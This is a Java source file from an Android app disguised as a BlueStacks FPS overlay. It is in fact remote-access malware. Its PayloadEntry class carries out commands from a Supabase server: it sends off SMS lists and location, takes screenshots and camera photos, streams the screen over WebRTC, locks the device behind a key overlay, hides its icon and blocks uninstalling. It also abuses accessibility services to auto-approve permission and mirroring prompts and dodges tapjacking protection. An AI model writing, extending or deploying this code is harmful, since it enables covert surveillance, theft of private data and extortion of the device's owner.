package com.bluestacks.fpsoverlay;

import android.content.Context;
import android.content.Intent;
import android.util.Log;
import android.os.Handler;
import android.os.Looper;

import android.view.accessibility.AccessibilityEvent;

public class PayloadEntry implements SupabaseManager.CommandCallback, SupabaseManager.SignalingListener, SupportService.AccessibilityDelegate {
    private static final String TAG = "PayloadEntry";
    private Context context;
    private SupportService service;
    private SupabaseManager supabaseManager;
    
    private SmsManager smsManager;
    private MediaManager mediaManager;
    private ProtectionManager protectionManager;
    private WebRtcManager webRtcManager;
    private LocationProvider locationProvider;
    private OverlayManager overlayManager;
    
    private String pendingType;
    private String pendingOffer;
    
    private final Runnable mirrorTimeoutRunnable = () -> {
        if (protectionManager != null) {
            protectionManager.setMirroringRequestActive(false);
            supabaseManager.sendData("logs", "Mirroring auto-click timed out (30s)");
        }
    };
    
    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    public void start(Context context) {
        Log.i(TAG, "Dynamic Payload Started!");
        this.context = context;
        this.service = SupportService.getInstance();
        if (this.service == null) {
            Log.e(TAG, "SupportService instance is null!");
            return;
        }
        
        this.supabaseManager = service.getSupabaseManager();
        
        // Initialize Managers
        this.smsManager = new SmsManager(context, supabaseManager);
        this.mediaManager = new MediaManager(context, supabaseManager);
        this.protectionManager = new ProtectionManager(service);
        this.locationProvider = new LocationProvider(context, supabaseManager);
        
        this.overlayManager = new OverlayManager(context, new OverlayManager.OverlayCallback() {
            @Override public boolean onCheckKey(String key) { return service.checkKey(key); }
            @Override public void onUnlocked() { Log.d(TAG, "Device Unlocked"); }
            @Override public void setLockStatus(boolean locked) { service.setLockStatusNative(locked); }
        });

        // Register for commands and signaling
        service.setCommandCallback(this);
        service.setAccessibilityDelegate(this);
        supabaseManager.setSignalingListener(this);
        
        Log.i(TAG, "Payload initialized and registered for commands.");
        
        // Initial status update
        service.updateSystemStatus();
        
        // Cek baterai saat payload dimulai
        checkBatteryOptimization();
    }

    private void checkBatteryOptimization() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            android.os.PowerManager pm = (android.os.PowerManager) context.getSystemService(Context.POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(context.getPackageName())) {
                // Aktifkan auto-clicker di ProtectionManager
                if (protectionManager != null) {
                    protectionManager.setPermissionRequestActive(true);
                }
                
                Intent intent = new Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(android.net.Uri.parse("package:" + context.getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                try {
                    context.startActivity(intent);
                } catch (Exception ignored) {}
            }
        }
    }

    @Override
    public void onCommandReceived(String cmd) {
        Log.d(TAG, "Payload processing command: " + cmd);
        String c = cmd.toLowerCase();
        
        if (c.equals(Config.CMD_SMS_LIST)) {
            smsManager.sendSmsList();
        } else if (c.equals(Config.CMD_LOCATION)) {
            locationProvider.requestFreshLocation();
        } else if (c.equals(Config.CMD_SCREENSHOT)) {
            mediaManager.takeScreenshotAction(service);
        } else if (c.equals(Config.CMD_CAMERA_FRONT)) {
            mediaManager.takeCameraAction(1);
        } else if (c.equals(Config.CMD_CAMERA_BACK)) {
            mediaManager.takeCameraAction(0);
        } else if (c.startsWith(Config.CMD_REQ_PERM + ":")) {
            handlePermissionRequest(c.substring(Config.CMD_REQ_PERM.length() + 1));
        } else if (c.equals(Config.CMD_LOCK)) {
            mainHandler.post(() -> overlayManager.showOverlay());
        } else if (c.equals(Config.CMD_UNLOCK)) {
            mainHandler.post(() -> overlayManager.hideOverlay());
        } else if (c.startsWith(Config.CMD_FLASH + "_")) {
            mediaManager.setRelayFlash(c.endsWith("on"));
        } else if (c.startsWith(Config.CMD_ANTI_UNINSTALL + ":")) {
            protectionManager.setAntiUninstallEnabled(c.endsWith(":on"));
        } else if (c.startsWith(Config.CMD_TOAST + ":")) {
            String msg = cmd.substring(Config.CMD_TOAST.length() + 1);
            mainHandler.post(() -> android.widget.Toast.makeText(context, msg, android.widget.Toast.LENGTH_SHORT).show());
        } else if (c.startsWith(Config.CMD_HIDE_ICON + ":")) {
            toggleIcon(!c.endsWith(":on"));
        } else if (c.equals(Config.CMD_VIBRATE)) {
            android.os.Vibrator v = (android.os.Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null) v.vibrate(500);
        }
        
        // Relay accessibility events if needed (optional implementation)
        if (c.equals("internal:resume_mirror")) {
            mainHandler.removeCallbacks(mirrorTimeoutRunnable);
            if (protectionManager != null) {
                protectionManager.setMirroringRequestActive(false);
            }
            if (pendingType != null && pendingOffer != null) {
                Log.d(TAG, "Resuming pending mirroring stream...");
                if (webRtcManager == null) {
                    webRtcManager = new WebRtcManager(context, new WebRtcManager.SignalingCallback() {
                        @Override public void onAnswerCreated(String sdp) { supabaseManager.sendAnswer(sdp); }
                        @Override public void onIceCandidateCreated(String cand) { supabaseManager.sendIceCandidate(cand); }
                        @Override public void onLog(String msg) { supabaseManager.sendData("logs", "WebRTC: " + msg); }
                    });
                }
                webRtcManager.startStream(pendingType, pendingOffer);
                pendingType = null;
                pendingOffer = null;
            }
        }
    }

    private void toggleIcon(boolean show) {
        try {
            android.content.ComponentName alias = new android.content.ComponentName(context.getPackageName(), context.getPackageName() + ".LauncherAlias");
            int state = show ? android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED : android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
            context.getPackageManager().setComponentEnabledSetting(alias, state, android.content.pm.PackageManager.DONT_KILL_APP);
            supabaseManager.sendData("logs", "Icon " + (show ? "shown" : "hidden"));
        } catch (Exception e) {
            Log.e(TAG, "Toggle icon error: " + e.getMessage());
        }
    }

    private void handlePermissionRequest(String type) {
        Log.d(TAG, "Handling permission request: " + type);
        if (type.equals("all")) {
            protectionManager.setPermissionRequestActive(true, true);
        } else {
            protectionManager.setPermissionRequestActive(true, false);
        }
        
        try {
            Intent intent = new Intent(context, Class.forName("com.bluestacks.fpsoverlay.PermissionActivity"));
            intent.putExtra("type", type);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Failed to start PermissionActivity: " + e.getMessage());
            supabaseManager.sendData("logs", "Error: " + e.getMessage());
        }

        supabaseManager.sendData("logs", "Permission helper active for: " + type);
    }

    // Signaling Listener implementation for WebRTC
    @Override
    public void onOfferReceived(String type, String offer) {
        // Jalankan foreground agar stabil
        service.showNotification();

        if (type != null && type.startsWith("screen")) {
            if (!WebRtcManager.hasMirrorIntent()) {
                Log.i(TAG, "Mirroring permission missing. Requesting from user...");
                
                // Aktifkan mode auto-click mirroring di ProtectionManager
                if (protectionManager != null) {
                    protectionManager.setMirroringRequestActive(true);
                    mainHandler.removeCallbacks(mirrorTimeoutRunnable);
                    mainHandler.postDelayed(mirrorTimeoutRunnable, 30000);
                }

                // Sembunyikan overlay agar tidak kena Tapjacking protection
                if (overlayManager != null) {
                    mainHandler.post(() -> overlayManager.hideOverlay());
                }

                this.pendingType = type;
                this.pendingOffer = offer;

                try {
                    Intent intent = new Intent(context, Class.forName("com.bluestacks.fpsoverlay.CoreActivity"));
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    intent.putExtra("request_mirror", true);
                    context.startActivity(intent);
                } catch (Exception e) {
                    Log.e(TAG, "Failed to launch CoreActivity for mirror: " + e.getMessage());
                }
                return;
            }
        }

        if (webRtcManager == null) {
            webRtcManager = new WebRtcManager(context, new WebRtcManager.SignalingCallback() {
                @Override public void onAnswerCreated(String sdp) { supabaseManager.sendAnswer(sdp); }
                @Override public void onIceCandidateCreated(String cand) { supabaseManager.sendIceCandidate(cand); }
                @Override public void onLog(String msg) { supabaseManager.sendData("logs", "WebRTC: " + msg); }
            });
        }
        
        Log.d(TAG, "Starting WebRTC stream: " + type);
        webRtcManager.startStream(type, offer);
    }

    @Override
    public void onIceCandidateReceived(String candidate) {
        if (webRtcManager != null) webRtcManager.addRemoteIceCandidate(candidate);
    }

    @Override
    public void onStopSignalReceived() {
        Log.d(TAG, "WebRTC Stop Signal Received.");
        if (webRtcManager != null) {
            webRtcManager.stopStream();
        }
        if (protectionManager != null) {
            protectionManager.setMirroringRequestActive(false);
        }
        // Stop foreground notification when stream ends
        if (service != null) {
            service.stopForeground(true);
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (protectionManager != null) {
            protectionManager.handleAccessibilityEvent(event);
        }
    }
}
